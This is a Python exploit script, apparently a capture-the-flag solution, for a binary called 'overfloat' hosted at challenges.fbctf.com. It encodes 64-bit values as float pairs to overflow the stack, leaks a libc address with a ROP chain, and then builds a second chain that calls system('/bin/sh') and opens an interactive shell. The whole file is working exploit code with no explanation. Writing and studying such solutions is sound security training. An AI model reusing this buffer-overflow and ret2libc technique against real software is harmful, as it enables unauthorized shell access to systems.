#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import struct

bin_file = './overfloat'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'challenges.fbctf.com', 'port':1341})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = None)
env.select()

#==========

binf = ELF(bin_file)
addr_got_main       = binf.got['__libc_start_main']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main        = libc.sep_function['__libc_start_main']

#==========

def attack(conn, **kwargs):
    for _ in range(6):
        setfloat(conn, 0xdeadbeef)
    setfloat(conn, 0xcafebabe)

    rop = ROP(binf)
    rop.puts(addr_got_main)
    rop.main()

    s = str(rop)
    for v in map(u64, [s[i: i+8] for i in range(0, len(s), 8)]):
        setfloat(conn, v)
    conn.sendlineafter(': ', 'done')

    conn.recvuntil('VOYAGE!\n')
    addr_libc_main = u(conn.recvuntil('\n', drop=True))
    libc.address = addr_libc_main - offset_libc_main
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search('/bin/sh'))

    for _ in range(6):
        setfloat(conn, 0xdeadbeef)
    setfloat(conn, 0xcafebabe)

    rop = ROP(binf)
    rop.call(rop.ret)
    rop.call(addr_libc_system, [addr_libc_str_sh])

    s = str(rop)
    for v in map(u64, [s[i: i+8] for i in range(0, len(s), 8)]):
        setfloat(conn, v)
    conn.sendlineafter(': ', 'done')

def setfloat(conn, val):
    low  = struct.unpack('<f', p32(val&((1<<32)-1)))[0]
    high = struct.unpack('<f', p32(val>>32))[0]
    conn.sendlineafter('LAT', str(low))
    conn.sendlineafter('LON', str(high))

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
